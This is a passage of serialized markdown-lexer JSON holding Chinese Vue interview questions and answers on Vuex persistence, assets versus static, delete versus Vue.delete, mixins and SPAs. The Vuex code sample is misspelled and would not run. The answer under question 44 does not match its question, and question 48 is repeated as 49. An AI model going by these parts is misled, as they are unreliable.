本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage","text":"vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage","escaped":false}]}]},{"type":"list_item","raw":"* tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","task":false,"loose":true,"text":"tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","tokens":[{"type":"text","raw":"tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","text":"tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","tokens":[{"type":"text","raw":"tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","text":"tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n  export default new Vuex.store({\\n   state: {\\n       user: localStorge.getItem(\'user\')  // 初始化时读取 本地存储\\n   },\\n   mutations: {\\n       updateUser (state, payload) {\\n           state.user = payload.user\\n           localStoregae.setItem(\'user\',payload.user) // 数据更新时 设置本地存储\\n       }\\n   }\\n})\\n\\n```","lang":"js","text":"  export default new Vuex.store({\\n   state: {\\n       user: localStorge.getItem(\'user\')  // 初始化时读取 本地存储\\n   },\\n   mutations: {\\n       updateUser (state, payload) {\\n           state.user = payload.user\\n           localStoregae.setItem(\'user\',payload.user) // 数据更新时 设置本地存储\\n       }\\n   }\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 44. 页面刷新了之后vuex中的数据消失怎么解决\\n\\n","depth":2,"text":"44. 页面刷新了之后vuex中的数据消失怎么解决","tokens":[{"type":"text","raw":"44. 页面刷新了之后vuex中的数据消失怎么解决","text":"44. 页面刷新了之后vuex中的数据消失怎么解决","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* 在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。\\n\\n* 在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。\\n\\n","task":false,"loose":true,"text":"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。\\n","tokens":[{"type":"text","raw":"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。\\n","text":"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。","tokens":[{"type":"text","raw":"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。","text":"在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。","escaped":false}]}]},{"type":"list_item","raw":"* 在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","task":false,"loose":true,"text":"在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","tokens":[{"type":"text","raw":"在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","text":"在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","tokens":[{"type":"text","raw":"在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","text":"在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 45. assets和static的区别\\n\\n","depth":2,"text":"45. assets和static的区别","tokens":[{"type":"text","raw":"45. assets和static的区别","text":"45. assets和static的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* 相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下\\n\\n* 不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下\\n\\n","task":false,"loose":true,"text":"相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下\\n","tokens":[{"type":"text","raw":"相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下\\n","text":"相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下","tokens":[{"type":"text","raw":"相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下","text":"相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下","escaped":false}]}]},{"type":"list_item","raw":"* 不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","task":false,"loose":true,"text":"不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","tokens":[{"type":"text","raw":"不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","text":"不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","tokens":[{"type":"text","raw":"不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","text":"不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"因为避免了压缩直接进行上传，在打包时会提高一定的效率，但是 static 中的资源文件由于没有进行压缩等操作，所以文件的体积也就相对于 assets 中打包后的文件提交较大点。在服务器中就会占据更大的空间","text":"因为避免了压缩直接进行上传，在打包时会提高一定的效率，但是 static 中的资源文件由于没有进行压缩等操作，所以文件的体积也就相对于 assets 中打包后的文件提交较大点。在服务器中就会占据更大的空间","tokens":[{"type":"text","raw":"因为避免了压缩直接进行上传，在打包时会提高一定的效率，但是 static 中的资源文件由于没有进行压缩等操作，所以文件的体积也就相对于 assets 中打包后的文件提交较大点。在服务器中就会占据更大的空间","text":"因为避免了压缩直接进行上传，在打包时会提高一定的效率，但是 static 中的资源文件由于没有进行压缩等操作，所以文件的体积也就相对于 assets 中打包后的文件提交较大点。在服务器中就会占据更大的空间","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 46. delete和Vue.delete删除数组的区别\\n\\n","depth":2,"text":"46. delete和Vue.delete删除数组的区别","tokens":[{"type":"text","raw":"46. delete和Vue.delete删除数组的区别","text":"46. delete和Vue.delete删除数组的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。\\n\\n* Vue.delete 直接删除了数组 改变了数组的键值。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。\\n\\n","task":false,"loose":true,"text":"delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。\\n","tokens":[{"type":"text","raw":"delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。\\n","text":"delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。","tokens":[{"type":"text","raw":"delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。","text":"delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。","escaped":false}]}]},{"type":"list_item","raw":"* Vue.delete 直接删除了数组 改变了数组的键值。","task":false,"loose":true,"text":"Vue.delete 直接删除了数组 改变了数组的键值。","tokens":[{"type":"text","raw":"Vue.delete 直接删除了数组 改变了数组的键值。","text":"Vue.delete 直接删除了数组 改变了数组的键值。","tokens":[{"type":"text","raw":"Vue.delete 直接删除了数组 改变了数组的键值。","text":"Vue.delete 直接删除了数组 改变了数组的键值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 47. 什么是 mixin？\\n\\n","depth":2,"text":"47. 什么是 mixin？","tokens":[{"type":"text","raw":"47. 什么是 mixin？","text":"47. 什么是 mixin？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。\\n\\n* 如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。\\n\\n* 然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。\\n\\n","task":false,"loose":true,"text":"Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。\\n","tokens":[{"type":"text","raw":"Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。\\n","text":"Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。","tokens":[{"type":"text","raw":"Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。","text":"Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。","escaped":false}]}]},{"type":"list_item","raw":"* 如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。\\n\\n","task":false,"loose":true,"text":"如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。\\n","tokens":[{"type":"text","raw":"如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。\\n","text":"如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。","tokens":[{"type":"text","raw":"如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。","text":"如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。","escaped":false}]}]},{"type":"list_item","raw":"* 然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","task":false,"loose":true,"text":"然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","tokens":[{"type":"text","raw":"然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","text":"然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","tokens":[{"type":"text","raw":"然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","text":"然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 48. 对 SPA 单页面的理解，它的优缺点分别是什么？\\n\\n","depth":2,"text":"48. 对 SPA 单页面的理解，它的优缺点分别是什么？","tokens":[{"type":"text","raw":"48. 对 SPA 单页面的理解，它的优缺点分别是什么？","text":"48. 对 SPA 单页面的理解，它的优缺点分别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"SPA（ single-page application ）仅在 Web 页面初始化时加载相应的 HTML、JavaScript 和 CSS。一旦页面加载完成，SPA 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 HTML 内容的变换，UI 与用户的交互，避免页面的重新加载。","text":"SPA（ single-page application ）仅在 Web 页面初始化时加载相应的 HTML、JavaScript 和 CSS。一旦页面加载完成，SPA 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 HTML 内容的变换，UI 与用户的交互，避免页面的重新加载。","tokens":[{"type":"text","raw":"SPA（ single-page application ）仅在 Web 页面初始化时加载相应的 HTML、JavaScript 和 CSS。一旦页面加载完成，SPA 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 HTML 内容的变换，UI 与用户的交互，避免页面的重新加载。","text":"SPA（ single-page application ）仅在 Web 页面初始化时加载相应的 HTML、JavaScript 和 CSS。一旦页面加载完成，SPA 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 HTML 内容的变换，UI 与用户的交互，避免页面的重新加载。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"优点：","text":"优点：","tokens":[{"type":"text","raw":"优点：","text":"优点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；\\n\\n* 基于上面一点，SPA 相对对服务器压力小；\\n\\n* 前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；\\n\\n","task":false,"loose":true,"text":"用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；\\n","tokens":[{"type":"text","raw":"用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；\\n","text":"用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；","tokens":[{"type":"text","raw":"用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；","text":"用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；","escaped":false}]}]},{"type":"list_item","raw":"* 基于上面一点，SPA 相对对服务器压力小；\\n\\n","task":false,"loose":true,"text":"基于上面一点，SPA 相对对服务器压力小；\\n","tokens":[{"type":"text","raw":"基于上面一点，SPA 相对对服务器压力小；\\n","text":"基于上面一点，SPA 相对对服务器压力小；","tokens":[{"type":"text","raw":"基于上面一点，SPA 相对对服务器压力小；","text":"基于上面一点，SPA 相对对服务器压力小；","escaped":false}]}]},{"type":"list_item","raw":"* 前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","task":false,"loose":true,"text":"前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","tokens":[{"type":"text","raw":"前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","text":"前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","tokens":[{"type":"text","raw":"前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","text":"前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"缺点：","text":"缺点：","tokens":[{"type":"text","raw":"缺点：","text":"缺点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；\\n\\n* 前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；\\n\\n* SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；\\n\\n","task":false,"loose":true,"text":"初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；\\n","tokens":[{"type":"text","raw":"初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；\\n","text":"初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；","tokens":[{"type":"text","raw":"初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；","text":"初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；","escaped":false}]}]},{"type":"list_item","raw":"* 前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；\\n\\n","task":false,"loose":true,"text":"前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；\\n","tokens":[{"type":"text","raw":"前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；\\n","text":"前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；","tokens":[{"type":"text","raw":"前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；","text":"前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；","escaped":false}]}]},{"type":"list_item","raw":"* SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","task":false,"loose":true,"text":"SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","tokens":[{"type":"text","raw":"SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","text":"SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","tokens":[{"type":"text","raw":"SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","text":"SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 49. 对 SPA 单页面的理解，它的优缺点分别是什么？\\n\\n","depth":2,"text":"49. 对 SPA 单页面的理解，它的优缺点分别是什么？","tokens":[{"type":"text","raw":"49. 对 SPA 单页面的理解，它的优缺点分别是什么？","text":"49. 对 SPA 单页面的理解，它的优缺点分别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 